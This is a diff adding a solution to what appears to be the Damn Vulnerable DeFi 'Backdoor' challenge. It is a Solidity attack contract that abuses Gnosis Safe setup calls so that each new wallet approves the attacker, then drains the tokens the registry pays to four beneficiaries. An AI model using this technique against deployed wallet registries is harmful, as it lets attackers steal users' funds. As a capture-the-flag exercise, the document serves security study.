@@ -8,6 +8,58 @@ import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
 import {WalletRegistry} from "../../../src/Contracts/backdoor/WalletRegistry.sol";
 import {GnosisSafe} from "gnosis/GnosisSafe.sol";
 import {GnosisSafeProxyFactory} from "gnosis/proxies/GnosisSafeProxyFactory.sol";
+import {GnosisSafeProxy} from "gnosis/proxies/GnosisSafeProxy.sol";
+import {IProxyCreationCallback} from "gnosis/proxies/IProxyCreationCallback.sol";
+
+contract AttackBackdoor {
+
+    address public immutable masterCopy;
+    address public immutable walletFactory;
+    DamnValuableToken public immutable token;
+    address public immutable registry;
+    uint public constant amount = 10*10**18;
+
+    constructor(
+        address masterCopyAddress,
+        address walletFactoryAddress,
+        address tokenAddress,
+        address _registry
+    ) {
+        masterCopy = masterCopyAddress;
+        walletFactory = walletFactoryAddress;
+        token = DamnValuableToken(tokenAddress);
+        registry = _registry;
+    }
+    function delegateApprove(address _spender, address _token) external {
+        DamnValuableToken(_token).approve(_spender, amount);
+    }
+
+    function attack (address[] memory beneficiaries) external {
+        for(uint i = 0; i < 4; i++){
+            address[] memory beneficiary = new address[](1);
+            beneficiary[0] = beneficiaries[i];
+            bytes memory _initializer = abi.encodeWithSelector(
+                GnosisSafe.setup.selector,
+                beneficiary,
+                1,
+                address(this),
+                abi.encodeWithSelector(AttackBackdoor.delegateApprove.selector, address(this), address(token)),
+                address(0),
+                0,
+                0,
+                0
+            );
+            (GnosisSafeProxy _proxy) = GnosisSafeProxyFactory(walletFactory).createProxyWithCallback(
+                masterCopy,
+                _initializer,
+                i,
+                IProxyCreationCallback(registry)
+            );
+
+            token.transferFrom(address(_proxy), msg.sender, amount);
+        }
+    }
+}
 
 contract Backdoor is Test {
     uint256 internal constant AMOUNT_TOKENS_DISTRIBUTED = 40e18;
@@ -77,6 +129,25 @@ contract Backdoor is Test {
 
     function testExploit() public {
         /** EXPLOIT START **/
+
+        // NOTE: This backdoor attack is the result of being able to make a delegatecall as part of the proxyWithCallback func
+        // when deploying a gnosis safe you can arbitrarily call any contract and maintain the msg.sender context this would allow
+        // us to approve tokens that the beneficiary would receive as part of the registry contract which then we can exploit and drain.
+
+        vm.startPrank(attacker);
+        AttackBackdoor attack = new AttackBackdoor(
+            address(masterCopy),
+            address(walletFactory),
+            address(dvt),
+            address(walletRegistry)
+        );
+        address[] memory beneficiaries = new address[](4);
+        beneficiaries[0] = alice;
+        beneficiaries[1] = bob;
+        beneficiaries[2] = charlie;
+        beneficiaries[3] = david;
+        attack.attack(beneficiaries);
+        vm.stopPrank();
 
         /** EXPLOIT END **/
         validation();
